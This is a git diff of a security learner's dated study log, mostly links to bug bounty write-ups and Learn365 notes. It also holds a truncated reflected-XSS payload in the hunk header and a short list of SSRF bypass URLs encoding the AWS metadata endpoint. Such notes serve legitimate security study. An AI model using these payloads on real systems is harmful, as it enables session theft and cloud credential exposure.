@@ -52,11 +52,33 @@ https://target[.]com/bi-security-login/login.jsp?msi=false&redirect="><img/src/o
 # 📅 11-Feb-2021
 ## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 41
 - [Cobalt Vulnerability Wiki](https://cobalt.io/vulnerability-wiki/)
+
 ## XSS on Public program
 - [Reflected XSS on Public Program](https://thevillagehacker.medium.com/reflected-xss-on-a-public-program-e8c0416daca1)
+
 ## Account TakeOver on online store
 - [Account Take Over](https://thevillagehacker.medium.com/account-take-over-due-to-no-rate-limitation-433bd7449aca)
 
 # 📅 12-Feb-2021
 ## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 42
 - [Race Condition](https://github.com/harsh-bothra/learn365/blob/main/days/day42.md)
+
+# 📅 13-Feb-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 43
+- [SMTP Open Relay Attack](https://github.com/harsh-bothra/learn365/blob/main/days/day43.md)
+
+# 📅 14-Feb-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 44
+- [Pentesting BACNet](https://github.com/harsh-bothra/learn365/blob/main/days/day44.md)
+
+## POST Message Logger
+- [Post Message Logger](https://github.com/thevillagehacker/My-Presentation-Slides)
+
+# 📅 15-Feb-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 45
+- [API Security Tips](https://github.com/inonshk/31-days-of-API-Security-Tips)
+
+## SSRF AWS Bypasses to access metadata endpoint
+- with Decimal IP: `http://2852039166/latest/meta-data/`
+- IPV6 Compressed: `http://[::ffff:a9fe:a9fe]/latest/meta-data/`
+- IPV6 Expanded: `http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/`
